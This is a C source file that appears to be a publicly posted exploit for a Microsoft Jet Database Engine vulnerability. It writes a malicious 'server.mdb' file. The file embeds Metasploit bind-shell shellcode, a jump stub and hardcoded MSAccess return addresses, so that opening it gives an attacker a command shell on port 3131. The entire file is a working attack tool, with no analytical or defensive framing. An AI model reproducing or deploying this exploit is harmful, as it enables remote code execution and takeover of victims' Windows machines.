/*
Microsoft Jet Database Engine Bind Shell Exploit by Kozan

(exploit coded because it is still unpatched since 31.03.2005!)
ref: http://www.securityfocus.com/news/11335

Bug Discovered by HexView
Exploit coded by Kozan
Credits to ATmaCA, HexView, S.Pearson
Mail: kozan@spyinstructors.com
Web: www.spyinstructors.com

Exploit binds shell prompt on port 3131

Tested on: Windows XP Pro-SP2 (Turkish)
Windows XP Pro-SP2 (English)
Windows XP Pro-SP1 (Turkish)
Windows XP Pro-SP1 (English)
Windows XP Pro-SP0 (Turkish)
Windows XP Pro-SP0 (English)
*/

#include <windows.h>
#include <stdio.h>


/* win32_bind - EXITFUNC=seh LPORT=3131 Size=344 Encoder=PexFnstenvSub
http://metasploit.com */

char shellcode[] =
"\x29\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x7b"
"\x27\x1e\x2e\x83\xeb\xfc\xe2\xf4\x87\x4d\xf5\x63\x93\xde\xe1\xd1"
"\x84\x47\x95\x42\x5f\x03\x95\x6b\x47\xac\x62\x2b\x03\x26\xf1\xa5"
"\x34\x3f\x95\x71\x5b\x26\xf5\x67\xf0\x13\x95\x2f\x95\x16\xde\xb7"
"\xd7\xa3\xde\x5a\x7c\xe6\xd4\x23\x7a\xe5\xf5\xda\x40\x73\x3a\x06"
"\x0e\xc2\x95\x71\x5f\x26\xf5\x48\xf0\x2b\x55\xa5\x24\x3b\x1f\xc5"
"\x78\x0b\x95\xa7\x17\x03\x02\x4f\xb8\x16\xc5\x4a\xf0\x64\x2e\xa5"
"\x3b\x2b\x95\x5e\x67\x8a\x95\x6e\x73\x79\x76\xa0\x35\x29\xf2\x7e"
"\x84\xf1\x78\x7d\x1d\x4f\x2d\x1c\x13\x50\x6d\x1c\x24\x73\xe1\xfe"
"\x13\xec\xf3\xd2\x40\x77\xe1\xf8\x24\xae\xfb\x48\xfa\xca\x16\x2c"
"\x2e\x4d\x1c\xd1\xab\x4f\xc7\x27\x8e\x8a\x49\xd1\xad\x74\x4d\x7d"
"\x28\x74\x5d\x7d\x38\x74\xe1\xfe\x1d\x4f\x12\x15\x1d\x74\x97\xcf"
"\xee\x4f\xba\x34\x0b\xe0\x49\xd1\xad\x4d\x0e\x7f\x2e\xd8\xce\x46"
"\xdf\x8a\x30\xc7\x2c\xd8\xc8\x7d\x2e\xd8\xce\x46\x9e\x6e\x98\x67"
"\x2c\xd8\xc8\x7e\x2f\x73\x4b\xd1\xab\xb4\x76\xc9\x02\xe1\x67\x79"
"\x84\xf1\x4b\xd1\xab\x41\x74\x4a\x1d\x4f\x7d\x43\xf2\xc2\x74\x7e"
"\x22\x0e\xd2\xa7\x9c\x4d\x5a\xa7\x99\x16\xde\xdd\xd1\xd9\x5c\x03"
"\x85\x65\x32\xbd\xf6\x5d\x26\x85\xd0\x8c\x76\x5c\x85\x94\x08\xd1"
"\x0e\x63\xe1\xf8\x20\x70\x4c\x7f\x2a\x76\x74\x2f\x2a\x76\x4b\x7f"
"\x84\xf7\x76\x83\xa2\x22\xd0\x7d\x84\xf1\x74\xd1\x84\x10\xe1\xfe"
"\xf0\x70\xe2\xad\xbf\x43\xe1\xf8\x29\xd8\xce\x46\x8b\xad\x1a\x71"
"\x28\xd8\xc8\xd1\xab\x27\x1e\x2e";


void Credits()
{
fprintf(stdout, "\r\n\r\n"
"Microsoft Jet Database Engine Bind Shell Exploit by Kozan\r\n"
"Bug Discovered by HexView\r\n"
"Exploit coded by Kozan\r\n"
"Credits to ATmaCA, HexView, S.Pearson\r\n"
"Mail: kozan@spyinstructors.com\r\n"
"Web: www.spyinstructors.com\r\n\r\n"
);
}

char header[]=
"\x00\x01\x00\x00\x53\x74\x61\x6E\x64\x61\x72\x64\x20\x4A\x65\x74"
"\x20\x44\x42\x00\x01\x00\x00\x00\xB5\x6E\x03\x62\x60\x09\xC2\x55"
"\xE9\xA9\x67\x72\x40\x3F\x00\x9C\x7E\x9F\x90\xFF\x85\x9A\x31\xC5"
"\x79\xBA\xED\x30\xBC\xDF\xCC\x9D\x63\xD9\xE4\xC3\x9F\x46\xFB\x8A"
"\xBC\x4E\xB2\x6D\xEC\x37\x69\xD2\x9C\xFA\xF2\xC8\x28\xE6\x27\x20"
"\x8A\x60\x60\x02\x7B\x36\xC1\xE4\xDF\xB1\x43\x62\x13\x43\xFB\x39"
"\xB1\x33\x00\xF7\x79\x5B\xA6\x23\x7C\x2A\xAF\xD0\x7C\x99\x08\x1F"
"\x98\xFD\x1B\xC9\x5A\x6A\xE2\xF8\x82\x66\x5F\x95\xF8\xD0\x89\x24"
"\x85\x67\xC6\x1F\x27\x44\xD2\xEE\xCF\x65\xED\xFF\x07\xC7\x46\xA1"
"\x78\x16\x0C\xED\xE9\x2D\x62\xD4\x54\x06\x00\x00\x34\x2E\x30\x00";



char body[]=
"\x00\x00\x80\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF"
"\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF"
"\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF"
"\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF"
"\x02\x01\xDE\x0B\x00\x00\x00\x00\x90\x90\x90\x90\x59\x06\x00\x00"
"\x11\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x53\x11\x00\x0B\x00\x11\x00\x02"
"\x00\x00\x00\x02\x00\x00\x00\x00\x06\x00\x00\x01\x06\x00\x00\x00"
"\x00\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11"
"\x00\x00\x00\x00\x00\x00\x00\x0C\x59\x06\x00\x00\x09\x00\x03\x00"
"\x00\x00\x09\x04\x00\x00\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x0C\x59\x06\x00\x00\x08\x00\x02\x00\x00\x00\x09\x04\x00\x00\x12"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x59\x06\x00\x00\x04\x00"
"\x01\x00\x00\x00\x09\x04\x00\x00\x13\x00\x00\x00\x00\x00\x0a\x00"
"\x08\x00\x08\x59\x06\x00\x00\x05\x00\x01\x00\x00\x00\x09\x04\x00"
"\x00\x13\x00\x00\x00\x00\x00\x12\x00\x08\x00\x04\x59\x06\x00\x00"
"\x07\x00\x02\x00\x00\x00\x09\x04\x00\x00\x13\x00\x00\x00\x00\x00"
"\x1A\x00\x04\x00\x0A\x59\x06\x00\x00\x0A\x00\x04\x00\x00\x00\x09"
"\x04\x00\x00\x12\x00\x00\x00\x00\x00\x00\x00\xFE\x01\x04\x59\x06"
"\x00\x00\x00\x00\x00\x00\x00\x00\x09\x04\x00\x00\x13\x00\x00\x00"
"\x00\x00\x00\x00\x04\x00\x0B\x59\x06\x00\x00\x0D\x00\x07\x00\x00"
"\x00\x09\x04\x00\x00\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0B"
"\x59\x06\x00\x00\x10\x00\x0A\x00\x00\x00\x09\x04\x00\x00\x12\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x0B\x59\x06\x00\x00\x0F\x00\x09"
"\x00\x00\x00\x09\x04\x00\x00\x12\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x0B\x59\x06\x00\x00\x0E\x00\x08\x00\x00\x00\x09\x04\x00\x00"
"\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0A\x59\x06\x00\x00\x02"
"\x00\x00\x00\x00\x00\x09\x04\x00\x00\x12\x00\x00\x00\x00\x00\x00"
"\x00\xFE\x01\x09\x59\x06\x00\x00\x06\x00\x01\x00\x00\x00\x09\x04"
"\x00\x00\x32\x00\x00\x00\x00\x00\x00\x00\xFE\x01\x04\x59\x06\x00"
"\x00\x01\x00\x00\x00\x00\x00\x09\x04\x00\x00\x13\x00\x00\x00\x00"
"\x00\x04\x00\x04\x00\x0B\x59\x06\x00\x00\x0C\x00\x06\x00\x00\x00"
"\x09\x04\x00\x00\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x59"
"\x06\x00\x00\x0B\x00\x05\x00\x00\x00\x09\x04\x00\x00\x12\x00\x00"
"\x00\x00\x00\x00\x00\xFE\x01\x03\x59\x06\x00\x00\x03\x00\x01\x00"
"\x00\x00\x09\x04\x00\x00\x13\x00\x00\x00\x00\x00\x08\x00\x02\x00"
"\x0E\x00\x43\x00\x6F\x00\x6E\x00\x6E\x00\x65\x00\x63\x00\x74\x00"
"\x10\x00\x44\x00\x61\x00\x74\x00\x61\x00\x62\x00\x61\x00\x73\x00"
"\x65\x00\x14\x00\x44\x00\x61\x00\x74\x00\x65\x00\x43\x00\x72\x00"
"\x65\x00\x61\x00\x74\x00\x65\x00\x14\x00\x44\x00\x61\x00\x74\x00"
"\x65\x00\x55\x00\x70\x00\x64\x00\x61\x00\x74\x00\x65\x00\x0A\x00"
"\x46\x00\x6C\x00\x61\x00\x67\x00\x73\x00\x16\x00\x46\x00\x6F\x00"
"\x72\x00\x65\x00\x69\x00\x67\x00\x6E\x00\x4E\x00\x61\x00\x6D\x00"
"\x65\x00\x04\x00\x49\x00\x64\x00\x04\x00\x4C\x00\x76\x00\x0E\x00"
"\x4C\x00\x76\x00\x45\x00\x78\x00\x74\x00\x72\x00\x61\x00\x10\x00"
"\x4C\x00\x76\x00\x4D\x00\x6F\x00\x64\x00\x75\x00\x6C\x00\x65\x00"
"\x0C\x00\x4C\x00\x76\x00\x50\x00\x72\x00\x6F\x00\x70\x00\x08\x00"
"\x4E\x00\x61\x00\x6D\x00\x65\x00\x0A\x00\x4F\x00\x77\x00\x6E\x00"
"\x65\x00\x72\x00\x10\x00\x50\x00\x61\x00\x72\x00\x65\x00\x6E\x00"
"\x74\x00\x49\x00\x64\x00\x16\x00\x52\x00\x6D\x00\x74\x00\x49\x00"
"\x6E\x00\x66\x00\x6F\x00\x4C\x00\x6F\x00\x6E\x00\x67\x00\x18\x00"
"\x52\x00\x6D\x00\x74\x00\x49\x00\x6E\x00\x66\x00\x6F\x00\x53\x00"
"\x68\x00\x6F\x00\x72\x00\x74\x00\x08\x00\x54\x00\x79\x00\x70\x00"
"\x65\x00\x83\x07\x00\x00\x01\x00\x01\x02\x00\x01\xFF\xFF\x00\xFF"
"\xFF\x00\xFF\xFF\x00\xFF\xFF\x00\xFF\xFF\x00\xFF\xFF\x00\xFF\xFF"
"\x00\xFF\xFF\x00\x10\x06\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00"
"\x81\x00\x00\x00\x00\x00\x83\x07\x00\x00\x00\x00\x01\xFF\xFF\x00"
"\xFF\xFF\x00\xFF\xFF\x00\xFF\xFF\x00\xFF\xFF\x00\xFF\xFF\x00\xFF"
"\xFF\x00\xFF\xFF\x00\xFF\xFF\x00\x11\x06\x00\x00\x08\x00\x00\x00"
"\x00\x00\x00\x00\x81\x00\x00\x00\x00\x00\x59\x06\x00\x00\x01\x00"
"\x00\x00\x01\x00\x00\x00\x00\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x04"
"\x04\x01\x00\x00\x00\x00\x59\x06\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x04\x04\x00\x00\x00"
"\x00\x00";


char shell_jmp[]=
"\x14\x00" // Expanded ID Parameter (20 bytes) to accommodate this code
"\x83\xC6\x08" // Add ESI,8 (Pointer to our shellcode)
"\xFF\xE6" // Call ESI (Execute Shellcode)
"\x90\x90\x90\x90"
"\x90\x90\x90\x90" // Not used
"\x90\x90\x90";


char EIP[]=
//"\x47\xAD\x05\x30"; // MSAccess 2003 (jmp edx)
"\xF7\x69\x05\x30"; // MSAccess 2002 (jmp edx)
//"\xFf\xf7\x07\x30"; // MSAccess 2000 (jmp edx)


char vuln_param[]=
"\x18\x00\x50\x00"
"\x61\x00\x72\x00"
"\x65\x00\x6E\x00"
"\x74\x00\x49\x00"
"\x64\x00\x4E\x00"
"\x61\x00\x6D\x00"
"\x65\x00\x00\x01" // 0100 will result in EDX pointing to a
// variable containing our MSAccess offset
"\x04\x06\x00\x00"
"\x05\x06" ;


char body2[]=
"\x02\x01\xA9\x0E\x00\x00\x00\x00\x4F\x01\x00\x00\x59\x06\x00\x00"
"\x34\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x53\x04\x00\x01\x00\x04\x00\x01"
"\x00\x00\x00\x01\x00\x00\x00\x12\x06\x00\x00\x13\x06\x00\x00\x00"
"\x00\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00\x04\x59\x06\x00\x00"
"\x02\x00\x01\x00\x00\x00\x09\x04\x00\x00\x13\x00\x00\x00\x00\x00"
"\x04\x00\x04\x00\x01\x59\x06\x00\x00\x03\x00\x01\x00\x00\x00\x09"
"\x04\x00\x00\x13\x00\x00\x00\x00\x00\x00\x00\x01\x00\x04\x59\x06"
"\x00\x00\x00\x00\x00\x00\x00\x00\x09\x04\x00\x00\x13\x00\x00\x00"
"\x00\x00\x00\x00\x04\x00\x09\x59\x06\x00\x00\x01\x00\x00\x00\x00"
"\x00\x09\x04\x00\x00\x32\x00\x00\x00\x00\x00\x07\x00\xFE\x01\x06"
"\x00\x41\x00\x43\x00\x4D\x00\x18\x00\x46\x00\x49\x00\x6E\x00\x68"
"\x00\x65\x00\x72\x00\x69\x00\x74\x00\x61\x00\x62\x00\x6C\x00\x65"
"\x00\x10\x00\x4F\x00\x62\x00\x6A\x00\x65\x00\x63\x00\x74\x00\x49"
"\x00\x64\x00\x06\x00\x53\x00\x49\x00\x44\x00\x83\x07\x00\x00\x00"
"\x00\x01\xFF\xFF\x00\xFF\xFF\x00\xFF\xFF\x09\xFF\xFF\x00\xFF\xFF"
"\x00\xFF\xFF\x00\xFF\xFF\x04\xFF\xFF\x12\xFF\xFF\x00\x14\x06\x00"
"\x00\x09\x000\x0\x00\x41\x00\x74\x00\x88\x00\x00\x00\x00\x00\x59"
"\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFF\xFF\xFF"
"\x00\x00\x00\x00\x04\x04\x00\x00\x00\x00\x00\x10\x00\x4F\x00\x62"
"\x00\x6A\x00\x65\x00\x63\x00\x74\x00\x49\x00\x64\x00\xFF\xFF\x00";


int main()
{
Credits();

int fark = 3096 - 344;

char mdb[94208];//min. mdb file size

memset (mdb,0x00,sizeof(mdb)); //fill with nulls
memcpy (mdb,header,sizeof(header));
memset (mdb+sizeof(header)-1,0x43, 7968);
memcpy (mdb+sizeof(header)-1+7969-1,body, sizeof(body));
memcpy (mdb+sizeof(header)-1+7968+sizeof(body)-1,shell_jmp, sizeof(shell_jmp));
memcpy (mdb+sizeof(header)-1+7968+sizeof(body)-1+sizeof(shell_jmp)-1, EIP,
sizeof(EIP));
memcpy (mdb+sizeof(header)-1+7968+sizeof(body)-1+sizeof(shell_jmp)-1+
sizeof(EIP)-1, vuln_param, sizeof(vuln_param));
memcpy (mdb+sizeof(header)-1+7968+sizeof(body)-1+sizeof(shell_jmp)-1+
sizeof(EIP)-1+sizeof(vuln_param)-1, shellcode, sizeof(shellcode));
memset (mdb+sizeof(header)-1+7968-1+sizeof(body)-1+sizeof(shell_jmp)-1+
sizeof(EIP)-1+sizeof(vuln_param)-1+sizeof(shellcode), 0x43, fark);
memcpy (mdb+sizeof(header)-1+7968-1+sizeof(body)-1+sizeof(shell_jmp)-1+
sizeof(EIP)-1+sizeof(vuln_param)-1+sizeof(shellcode)-1+fark-1,
body2,sizeof(body2));

FILE *fp;

if( (fp=fopen("server.mdb","wb")) == NULL )
{
fprintf(stderr, "Can not create server.mdb !!!\r\n");
return -1;
}

fwrite(mdb,1,sizeof(mdb),fp);
fclose(fp);

fprintf(stdout, "server.mdb created in the current directory...\r\n");
return 0;
}